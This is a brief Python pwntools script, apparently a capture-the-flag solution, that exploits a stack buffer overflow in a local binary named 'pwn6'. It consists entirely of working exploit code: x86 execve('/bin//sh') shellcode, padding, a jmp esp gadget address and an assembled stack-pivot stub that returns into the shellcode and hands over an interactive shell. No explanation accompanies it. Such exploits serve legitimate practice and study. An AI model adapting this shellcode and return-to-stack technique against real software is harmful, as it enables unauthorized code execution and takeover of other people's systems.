from pwn import *
context.log_level = 'debug'
sh = process('./pwn6')

bss = 0x0804a000
shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
jmp_esp = 0x08048504

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')

sh.recv()
payload = shellcode + 'a' * (36-len(shellcode)) + p32(jmp_esp) + sub_esp_jmp

sh.sendline(payload)

sh.interactive()
